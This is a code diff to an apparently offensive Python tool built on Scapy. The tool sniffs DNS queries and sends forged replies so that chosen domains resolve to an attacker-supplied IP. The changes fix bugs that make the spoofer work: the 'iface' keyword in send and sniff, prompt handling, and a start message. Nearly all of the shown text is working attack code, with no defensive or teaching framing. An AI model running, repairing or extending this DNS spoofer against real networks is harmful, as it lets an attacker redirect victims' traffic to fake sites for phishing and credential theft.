@@ -20,7 +20,7 @@ def dns_responder(dns_ip: str, dns_server_ip, interface):
             for domain in spoof_domains:
                 if domain in str(pkt["DNS Question Record"].qname) or domain in pkt["DNS Question Record"].qname.decode('utf-8') :
                     spoofed_pkt = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,qr=1,ancount=1,rd=1, qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname, rdata=dns_ip)/DNSRR(rrname=domain + ".",rdata=dns_ip))
-                    send(spoofed_pkt, interface=interface)
+                    send(spoofed_pkt, iface=interface)
                     return f"Spoofed DNS Response Sent: {pkt[IP].src} {pkt[DNSQR].qname}"
                 
             else:
@@ -42,9 +42,9 @@ def main():
     for domain in spoof_domains:
         print(domain)
     
-    add = input("Any domains to add or delete: (y/n)").strip()
+    add = input("Any domains to add or delete (y/n): ").strip()
     if add == "y":
-        decision = input("Add (a) OR delete (d) domain").strip()
+        decision = input("Add (a) OR delete (d) domain: ").strip()
         
         if decision == "a":
             number_to_add = int(input("How many: ").strip())
@@ -52,7 +52,7 @@ def main():
                 domain = input("Enter domain (without http and www): ").strip()
                 spoof_domains.append(domain)
         
-        else:
+        elif decision == "d":
             number_to_delete = int(input("How many: ").strip())
             for i in range(number_to_delete):
                 domain = input("Enter domain (without http and www): ").strip()
@@ -60,7 +60,9 @@ def main():
 
     
     #Start the spoofing
-    sniff(filter=pkt_filter, prn=dns_responder(dns_server_ip, dns_server_ip, interface), interface=interface)
+    print("Starting DNS spoofing.")
+    sniff(filter=pkt_filter, prn=dns_responder(dns_server_ip, dns_server_ip, interface), iface=interface)
+    
 
 
 if __name__ == "__main__":
